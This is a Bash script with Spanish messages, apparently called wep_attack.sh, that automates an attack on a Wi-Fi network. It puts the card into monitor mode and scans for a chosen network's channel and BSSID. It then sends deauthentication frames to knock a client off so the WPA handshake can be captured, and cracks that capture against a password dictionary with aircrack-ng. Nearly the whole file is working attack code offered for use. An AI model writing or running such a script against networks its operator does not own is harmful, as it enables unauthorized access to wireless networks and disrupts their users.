#!/bin/bash

if [ $# -eq 2 ]; then
        interfaz=$1
	diccionario=$2

        echo "[+] Lenvantando la interfaz $interfaz a modo monitor....."
        airmon-ng check kill
        airmon-ng start $interfaz
        echo "[+] Busca la red a vulnerar: (Una vez sepas cual red atacar, cierra la ventana externa) "

        rm archivo &>/dev/null

        gnome-terminal -- airodump-ng wlan0mon -w archivo --output-format csv &
        read ssid

        channel=$(cat archivo-01.csv | grep "$ssid" | awk '{print $6}' | tr -d ',')
        mac=$(cat archivo-01.csv | grep "$ssid" | awk '{print $1}' | tr -d ',')

        echo "[+] $interfaz $channel $mac"

        rm archivo* &>/dev/null
        gnome-terminal -- airodump-ng --channel $channel --bssid $mac wlan0mon -w archivo --output-format csv
        #sleep 5

        mac_cliente=$(cat archivo-01.csv | tail -n 2 | awk '{print $1}' | tr -d ',')

        rm archivo* &>/dev/null

        echo $mac_cliente

	xterm -hold -e airodump-ng --channel $channel --bssid $mac --write wpa_crack wlan0mon &
	xterm -hold -e aireplay-ng --deauth 1 -c "$mac_cliente" -a "$mac" wlan0mon

	aircrack-ng -w $diccionario wpa_crack-01.cap

	rm wpa_crack* &>/dev/null

        airmon-ng stop wlan0mon
        service NetworkManager restart
else
        echo "[!] Ejecutar asi:"
        echo -e "\tsudo ./wep_attack.sh interfaz diccionario"
        echo "[+] Interfaces: "
        ifconfig | grep ": f" | awk '{print $1}' | tr -d ':'
fi
